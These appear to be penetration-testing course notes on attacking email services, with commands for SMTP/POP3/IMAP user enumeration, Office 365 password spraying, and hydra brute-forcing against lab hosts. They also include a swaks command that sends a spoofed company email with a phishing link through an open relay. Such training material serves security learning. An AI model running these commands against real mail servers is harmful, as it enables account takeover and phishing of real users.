# Attacking Email Services

By default, POP3 clients remove downloaded messages from the email server.
IMAP4 clients do not remove downloaded messages from the email server.

-> This behavior makes it easy to access email messages from multiple devices.

## Enumeration

host -t MX hackthebox.eu
host -t MX microsoft.com
dig mx plaintext.do | grep "MX" | grep -v ";"
dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.

host -t A mail1.inlanefreight.htb.

Port	Service
TCP/25	SMTP Unencrypted
TCP/143	IMAP4 Unencrypted
TCP/110	POP3 Unencrypted
TCP/465	SMTP Encrypted
TCP/587	SMTP Encrypted/STARTTLS
TCP/993	IMAP4 Encrypted
TCP/995	POP3 Encrypted

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $TARGET

## Misconfigurations

### Authentication

telnet $TARGET 25

-> VRFY command check the validity of a particular email username.

VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

-> EXPN same that VRFY expect if we request a distribution list it will list all the users of this list.

EXPN john
250 2.1.0 john@inlanefreight.htb

EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb

-> RCPT TO identifies the recipient of the email message. 

MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok

### POP3 Protocol

telnet $TARGET 110

USER julio
-ERR

USER john
+OK

### Automate enumeration

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $TARGET

### Cloud Enumeration

-> Validate if our target domain is using Office 365 :
git clone https://github.com/0xZDH/o365spray
python3 o365spray.py --validate --domain msplaintext.xyz

-> Find usernames :
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

## Password Attacks

hydra -L users.txt -p 'Company01!' -f $TARGET pop3
hydra -l 'fiona@inlanefreight.htb' -p password.list -f $TARGET smtp
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

## Protocol Specifics Attacks : Open relay

Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. 

-> Mask the source of the messages

nmap -p25 -Pn --script smtp-open-relay $TARGET

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)

swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $TARGET

## LAB

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $TARGET

######## Scan started at Wed Nov 15 16:10:07 2023 #########
10.129.203.12: marlin@inlanefreight.htb exists

sudo nmap $TARGET -sV -p110,143,993,995 -sC

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $TARGET

PORT    STATE    SERVICE VERSION
25/tcp  open     smtp    hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp open     pop3    hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
143/tcp open     imap    hMailServer imapd
|_imap-capabilities: IMAP4rev1 QUOTA NAMESPACE ACL IDLE RIGHTS=texkA0001 CAPABILITY OK CHILDREN SORT IMAP4 completed
465/tcp filtered smtps
587/tcp open     smtp    hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp filtered imaps
995/tcp filtered pop3s
Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows

hydra -l 'marlin@inlanefreight.htb' -p password.list -f $TARGET pop3

hydra -l marlin@inlanefreight.htb -p password.list -f $TARGET imap


hydra -L user.txt -p password.list -f $TARGET pop3


telnet $TARGET 143 
1 LOGIN marlin@inlanefreight.htb liverpool

auxiliary(scanner/telnet/telnet_login)
set USERNAME marlin@inlanefreight.htb
set PASS_FILE /home/htb-ac-786011/password.list
set RPORT 143
set RHOSTS 10.129.203.12
set STOP_ON_SUCCESS true

[!] 10.129.203.12:143     - No active DB -- Credential data will not be saved!
[+] 10.129.203.12:143     - 10.129.203.12:143 - Login Successful: marlin@inlanefreight.htb:liverpool
[*] 10.129.203.12:143     - Attempting to start session 10.129.203.12:143 with marlin@inlanefreight.htb:liverpool
[-] Command shell session 1 is not valid and will be closed
[*] 10.129.203.12 - Command shell session 1 closed.
[*] 10.129.203.12:143     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

telnet $TARGET 143 
1 LOGIN marlin@inlanefreight.htb liverpool

telnet $TARGET 110
USER marlin@inlanefreight.htb	
PASS liverpool

openssl s_client -connect $TARGET:imaps
curl -k 'imaps://$TARGET' --user marlin@inlanefreight.htb	
openssl s_client -connect $TARGET:pop3s

hydra -l 'marlin@inlanefreight.htb' -p password.list -f $TARGET pop3s
hydra -l 'marlin@inlanefreight.htb' -p password.list -f $TARGET imaps

nmap -p 143,993 --script imap-brute userdb=users.txt,passdb=password.list $TARGET

nmap -p 143,993 --script imap-brute --script-args userdb=user.list,passdb=passwords.list $TARGET

nmap -p 25 --script smtp-brute --script-args userdb=user.list,passdb=passwords.list $TARGET

hydra -f -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://$TARGET -t 64

[25][smtp] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear

telnet $TARGET 143
1 LOGIN marlin@inlanefreight.htb poohbear
1 LIST "" *
1 SELECT INBOX
1 STATUS INBOX (MESSAGES)
1 FETCH 1 all
1 FETCH 1 (BODY[HEADER])
1 FETCH 1 (BODY[HEADER.FIELDS (Subject)])
1 FETCH 1 (BODY[TEXT])